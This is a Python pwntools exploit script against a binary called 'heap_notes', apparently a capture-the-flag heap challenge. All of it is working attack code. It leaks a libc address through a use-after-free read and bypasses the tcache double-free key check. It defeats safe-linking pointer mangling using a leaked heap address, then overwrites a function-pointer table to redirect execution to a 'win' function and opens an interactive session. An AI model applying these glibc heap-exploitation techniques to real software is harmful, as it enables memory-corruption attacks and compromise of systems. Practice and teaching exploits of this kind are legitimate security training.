#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./build/heap_notes", checksec=False)
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

HOST = args.get("HOST", "127.0.0.1")
PORT = int(args.get("PORT", 1337))


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def menu_choice(io, c):
    io.sendlineafter(b">", str(c).encode())


def create(io, idx, size, fill=False, data=b""):
    menu_choice(io, 1)
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendlineafter(b"Fill now? (y/n)", b"y" if fill else b"n")
    if fill:
        io.sendafter(b"Data:", data.ljust(size, b"A"))


def edit(io, idx, data):
    menu_choice(io, 2)
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendafter(b"Data:", data)


def dump(io, idx):
    menu_choice(io, 3)
    io.sendlineafter(b"Index:", str(idx).encode())
    # read until we hit a hexdump line
    while True:
        line = io.recvline().strip()
        if line and all(c in b"0123456789abcdef " for c in line.lower()):
            return line


def delete(io, idx):
    menu_choice(io, 4)
    io.sendlineafter(b"Index:", str(idx).encode())


def list_notes(io):
    menu_choice(io, 5)
    out = []
    for _ in range(8):
        out.append(io.recvline().strip())
    return out


def speak(io, idx):
    menu_choice(io, 6)
    io.sendlineafter(b"Index:", str(idx).encode())


def parse_ptr(b):
    return int(b, 16)


def main():
    io = start()

    # 1) libc leak from unsorted bin (UAF dump of freed chunk)
    big = 0x500
    create(io, 0, big, fill=True, data=b"A")
    create(io, 1, 0x40, fill=True, data=b"G")  # guard chunk
    delete(io, 0)

    leak_line = dump(io, 0)
    leak_bytes = bytes.fromhex(leak_line.decode())
    fd = u64(leak_bytes[:8])
    libc.address = fd - 0x219ce0  # main_arena+96 on glibc 2.35
    log.info(f"libc leak fd=0x{fd:x}")
    log.info(f"libc base=0x{libc.address:x}")

    # 2) tcache poisoning via double-free (bypass key check)
    small = 0x60
    create(io, 2, small, fill=True, data=b"B")
    create(io, 3, small, fill=True, data=b"C")

    delete(io, 2)
    delete(io, 3)
    # clear tcache key in chunk 2 to bypass double-free check
    edit(io, 2, p64(0) + p64(0))
    delete(io, 2)  # double free

    # heap leak from list
    lines = list_notes(io)
    # line format: [2] ptr=0x... size=... inuse=...
    p2 = lines[2].split()[1].split(b"=")[1]
    heap_leak = int(p2, 16)
    heap_base = heap_leak & ~0xfff
    log.info(f"heap leak=0x{heap_leak:x} heap_base=0x{heap_base:x}")

    target = elf.symbols["hooks"] + 0x80
    fake_fd = target ^ (heap_leak >> 12)
    edit(io, 2, p64(fake_fd))

    # allocate to get chunk at target
    create(io, 4, small, fill=True, data=b"D")
    create(io, 5, small, fill=True, data=p64(elf.symbols["win"]))

    # trigger
    speak(io, 5)
    io.interactive()


if __name__ == "__main__":
    main()
